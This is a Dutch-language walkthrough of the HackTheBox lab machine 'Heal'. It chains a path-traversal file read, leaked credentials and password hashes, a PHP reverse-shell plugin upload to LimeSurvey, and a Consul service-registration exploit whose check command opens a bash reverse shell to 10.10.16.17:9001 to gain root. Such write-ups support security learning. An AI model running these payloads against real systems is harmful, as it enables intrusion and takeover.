# Heal

Op het eerste gezicht zien we een login pagina en draait het met een React app.
Hier halen we gelijk wat extra routes uit de code. Namelijk:

- heal.htb/survey
- heal.htb/profile
- heal.htb/resume

Met `heal.htb/survey` worden we door gelinkt naar een `take-survey` subdomein
waar `limesurvey` als software op draait. Met een beetje zoeken halen we hier
ook de eerste user data op

```
ralph@heal.htb
```

Op de survey pagina vinden we ook een admin login maar eigenlijk kom ik hier
niet verder. Terug focussen op de hoofdpagina.

## Api.heal.htb

Na het aanmaken van een account zien we ook calls naar `api.heal.htb`. Met een
download voor gegenereerde PDF's. Dit is interessant om naar te kijken ivm LFI
achtige exploits. En zoals verwacht. Hier is een LFI want met
`../../../../etc/passwd` krijg ik netjes etc/passwd terug.

Hiermee hebben we ook gelijk de volgende user, namelijk `ron`. Daarnaast
bevestiging dat `ralph` ook een user op het systeem is.

Met wat verder snuffelen in de nginx configs leren we dat dit allemaal draait
met flask servers.

Ik kan niet de files vinden voor de survey pagina maar wat wel opvalt is dat de
`www-data` user (wat ik vermoed degene is die de services draait) bij de folder
van `ralph` mag.

# Ruby

Ok deze server is een bende. We hebben een survey tool op PHP, een main page die
met express (nodejs) draait en de API is weer ruby. Maar, het voordeel van ruby
is wel dat alles maar dan ook alles lekker vaststaat en dus makkelijk via LFI op
te halen is.

Zo ook de `config/database.yml`. Hiermee krijgen we de locatie van de database
bestanden en hebben we dus een aantal extra users om naar te kijken.

```
ralph@heal.htb:147258369
```

Met deze info kan ik ook op het admin panel inloggen van de survey tool.

## POC

Op de admin panel kunnen we mooi plugins uploaden en dus een mooie poc met een
PHP revshell maken.

## Postgres

In `config.php` komen we ook een connection string tegen voor postgres. Deze is
als volgt:

```
pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;
```

Hierin vinden we weer de ralph user met de volgende data:

```
ralph:$2y$10$qMS2Rbu5NXKCPI5i6rjQPexhhJk33kv3KNt4uNjJ5XEvV9hv.om/C
```

Wat dezelfde info is als die we eerder al vonden in de sqlite DB. Wat wel zo is
is dat we op de Ron user kunnen inloggen met dat database wachtwoord.

# Ron

Ron gebruiker geeft niet extra mogelijkheden. Maar wat we wel leren is dat er op
poort 8500 een hashicorp consul service draait. Met een SSH port forward kunnen
we hier bij.

# Consul

Met consul is het mogelijk om nieuwe agents toe te voegen waarbij er gelijk een
`check` argument is om te valideren of de service draait. Hierin kan natuurlijk
een revshell staan en met de volgende POC hebben we root te pakken:

```bash
#!/bin/bash

curl -X PUT 'http://localhost:8500/v1/agent/service/register' \
    --data-raw '{"Address": "127.0.0.1", "check": { "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.17/9001 0>&1"], "interval": "10s", "timeout": "3600s"}, "ID": "freckles", "Name": "freckles", "Port": 80}' \
    -v
```
